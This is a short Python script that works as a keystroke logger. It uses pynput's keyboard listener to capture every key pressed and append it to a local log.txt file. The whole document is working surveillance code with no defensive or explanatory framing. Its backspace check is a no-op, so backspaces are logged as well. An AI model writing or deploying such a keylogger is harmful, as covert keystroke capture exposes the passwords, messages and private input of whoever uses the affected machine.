from pynput.keyboard import Listener

def keyLogger(key):
    letter = str(key)
    letter = letter.replace("'","")
    if letter == "Key.backspace":
        pass
    with open("log.txt","a") as f:
        f.write(letter)
        
with Listener(on_press=keyLogger) as l:
    l.join()
